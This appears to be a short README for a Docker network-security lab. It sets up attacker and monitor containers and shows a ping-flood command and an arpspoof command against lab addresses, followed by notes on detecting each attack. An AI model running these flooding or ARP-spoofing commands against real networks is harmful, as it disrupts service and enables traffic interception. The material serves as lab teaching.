
# Start
```
sudo docker compose run --build --rm attacker zsh
sudo docker compose run --build --rm monitor zsh
```
# Attack 
## Ping Flooding
```
sudo ping -f -s 65500 172.20.0.3  
```
## ARP Spoofing
```
arpspoof -i eth0 -t 172.20.0.3 172.20.0.2
WRONG
```
# Exit
```
sudo docker compose down
```

# Extra
```
sudo docker compose build  
sudo docker compose run --rm idle sh  
sudo docker network create --driver=bridge --subnet=172.20.0.0/16 br0  
sudo docker run --network=br0 --name=host -d python:3.8   
sudo docker cp ./send.py host:./  
sudo docker exec -it host sh  
sudo docker stop host  
sudo docker rm host
```

# To Verify Attacks
## Ping Flooding
Packet Count and Rate:

    Monitor the number of ICMP packets received over time. A sudden spike in packet count might indicate a flooding attack.
    Check the packet rate to identify if it exceeds normal thresholds.
## Arp Spoofing
Traffic Analysis:

    Analyze network traffic patterns. ARP spoofing may cause unusual or unexpected patterns, such as an increase in ARP requests and responses.
ARP Cache Monitoring:

    Monitor the ARP cache of devices on the network. Tools like arp -a on Windows or arp -n on Linux can display ARP cache entries. Look for unexpected or frequent changes.


